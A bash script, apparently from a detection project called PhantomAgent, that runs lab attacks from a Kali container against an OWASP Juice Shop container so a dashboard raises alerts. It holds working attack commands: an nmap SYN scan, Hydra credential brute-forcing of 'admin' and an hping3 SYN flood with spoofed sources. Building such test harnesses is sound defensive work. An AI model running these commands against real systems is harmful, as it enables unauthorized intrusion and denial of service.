#!/bin/bash
# ===============================================================================
# PhantomAgent — Demo Attack Flow Automation Script
# Executes real attacks inside the isolated Kali Linux Docker container
# ===============================================================================

TARGET_IP="172.28.0.5"

echo "==============================================================================="
echo "              PHANTOMAGENT — LIVE ATTACK DEMONSTRATION SUITE                   "
echo "==============================================================================="
echo "Target IP : ${TARGET_IP} (Juice Shop Container)"
echo "Attacker  : Container 'kali_attacker' (IP: 172.28.0.10)"
echo "==============================================================================="
echo "Select Attack Scenario to Execute:"
echo " 1) Reconnaissance   : Nmap Stealth SYN Port Scan (-sS)"
echo " 2) Brute Force      : Hydra HTTP Credential Spraying"
echo " 3) Zero-Day Anomaly : High-Entropy Structural Anomaly Flow"
echo " 4) Full Suite       : Execute all 3 attack scenarios sequentially"
echo "==============================================================================="

read -p "Enter choice [1-4]: " CHOICE

run_recon() {
    echo -e "\n[ATTACK 1/3] Executing Nmap Stealth SYN Scan against ${TARGET_IP}..."
    docker exec kali_attacker nmap -sS -p 1-100 ${TARGET_IP}
    echo "✔ Nmap scan completed. Watch React Dashboard for PORT_SCAN alert."
}

run_bruteforce() {
    echo -e "\n[ATTACK 2/3] Executing Hydra Credential Spraying against ${TARGET_IP}..."
    docker exec kali_attacker hydra -l admin -P /usr/share/wordlists/nmap.lst ${TARGET_IP} http-head / 2>/dev/null || true
    echo "✔ Hydra brute force completed. Watch React Dashboard for BRUTE_FORCE alert."
}

run_zeroday() {
    echo -e "\n[ATTACK 3/3] Executing Un-labeled Zero-Day Structural Anomaly against ${TARGET_IP}..."
    docker exec kali_attacker hping3 -S --flood --rand-source -p 3000 -c 100 ${TARGET_IP} 2>/dev/null || true
    echo "✔ Zero-day anomaly burst completed. Watch React Dashboard for UNKNOWN_ZERO_DAY alert (GNN Score > 0.75)."
}

case $CHOICE in
    1)
        run_recon
        ;;
    2)
        run_bruteforce
        ;;
    3)
        run_zeroday
        ;;
    4)
        run_recon
        sleep 5
        run_bruteforce
        sleep 5
        run_zeroday
        ;;
    *)
        echo "Invalid option."
        exit 1
        ;;
esac

echo -e "\n==============================================================================="
echo "Demo attack execution finished."
echo "==============================================================================="
